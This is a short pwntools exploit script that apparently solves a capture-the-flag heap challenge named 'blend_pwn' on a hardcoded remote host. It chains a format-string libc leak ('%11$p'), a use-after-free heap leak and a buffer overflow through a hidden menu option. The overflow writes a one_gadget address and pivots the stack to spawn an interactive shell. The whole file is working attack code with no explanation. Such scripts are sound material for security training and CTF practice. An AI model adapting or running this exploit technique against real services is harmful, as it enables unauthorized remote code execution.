#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process('blend_pwn')
p = remote('47.111.96.55', 54104)
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
 
def login(payload):
  p.sendafter('Please enter a name: ', payload)

def add(payload):
  p.sendlineafter('Enter your choice >', '2')
  p.sendafter('input note:', payload)

def delete(idx):
  p.sendlineafter('Enter your choice >', '3')
  p.sendlineafter('index>', str(idx))

def show(idx):
  p.sendlineafter('Enter your choice >', '4')

def gift(payload):
  p.sendlineafter('Enter your choice >', '666')
  p.sendafter('Please input what you want:', payload)

def info():
  p.sendlineafter('Enter your choice >', '1')

def menu(idx):
  p.sendlineafter('Enter your choice >', str(idx))


if __name__ == "__main__":
  # gdb.attach(p, 'b *$rebase(0x117C)\n') 
  login('%11$p')
  info() 
  p.recvuntil('Current user:')
  leak = int((p.recv(14)), 16) - 0x020840
  success('LIBC:\t' + str(hex(leak)))

  payload = 'a' * 0x18 + p64(0x45226 + leak)
  add(payload + '\n')
  add('a\n')
  delete(0)
  delete(1)

  show(1)
  p.recvuntil('index')
  p.recvuntil('index')
  p.recvuntil(':')
  leak = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00'))
  success('HEAP:\t' + str(hex(leak)))
  pivot = leak + 0x20

  payload = 'a' * 0x20 + p64(pivot)
  gift(payload)

  # gdb.attach(p)
  p.interactive()